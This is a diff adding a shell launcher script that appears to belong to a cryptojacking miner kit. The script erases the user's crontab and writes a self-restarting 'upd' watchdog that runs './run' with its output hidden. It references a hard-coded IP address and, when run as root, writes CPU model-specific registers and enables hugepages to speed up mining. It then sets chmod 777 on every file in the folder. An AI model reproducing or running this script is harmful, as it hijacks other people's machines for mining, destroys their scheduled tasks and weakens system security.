@@ -1,0 +1,92 @@
+#!/bin/sh
+crontab -r
+pwd > dir.dir
+dir=$(cat dir.dir)
+
+#connok=$(ping -c 1 45.9.148.228 | echo $?)
+
+#./init0
+#sleep 5
+
+echo "#!/bin/sh
+cd $dir
+if test -r $dir/bash.pid; then
+pid=\$(cat $dir/bash.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null" > upd
+
+optimize_func() {
+  MSR_FILE=/sys/module/msr/parameters/allow_writes
+
+  if test -e "$MSR_FILE"; then
+  	echo on > $MSR_FILE
+  else
+  	modprobe msr allow_writes=on
+  fi
+
+  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
+  	then
+  	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
+  		then
+  			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
+  				then
+  					echo "Detected Zen4 CPU"
+  					wrmsr -a 0xc0011020 0x4400000000000
+  					wrmsr -a 0xc0011021 0x4000000000040
+  					wrmsr -a 0xc0011022 0x8680000401570000
+  					wrmsr -a 0xc001102b 0x2040cc10
+  					echo "MSR register values for Zen4 applied"
+  				else
+  					echo "Detected Zen3 CPU"
+  					wrmsr -a 0xc0011020 0x4480000000000
+  					wrmsr -a 0xc0011021 0x1c000200000040
+  					wrmsr -a 0xc0011022 0xc000000401500000
+  					wrmsr -a 0xc001102b 0x2000cc14
+  					echo "MSR register values for Zen3 applied"
+  				fi
+  		else
+  			echo "Detected Zen1/Zen2 CPU"
+  			wrmsr -a 0xc0011020 0
+  			wrmsr -a 0xc0011021 0x40
+  			wrmsr -a 0xc0011022 0x1510000
+  			wrmsr -a 0xc001102b 0x2000cc16
+  			echo "MSR register values for Zen1/Zen2 applied"
+  		fi
+  elif grep "Intel" /proc/cpuinfo > /dev/null;
+  	then
+  		echo "Detected Intel CPU"
+  		wrmsr -a 0x1a4 0xf
+  		echo "MSR register values for Intel applied"
+  else
+  	echo "No supported CPU detected"
+  fi
+
+
+  sysctl -w vm.nr_hugepages=$(nproc)
+
+  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+  do
+      echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+  done
+
+  echo "1GB pages successfully enabled"
+}
+
+
+
+if [ $(id -u) = 0 ]; then
+   echo "Running as root"
+   optimize_func
+else
+   echo "Not running as root"
+   sysctl -w vm.nr_hugepages=$(nproc)
+fi
+
+
+chmod u+x upd
+chmod 777 *
+./upd
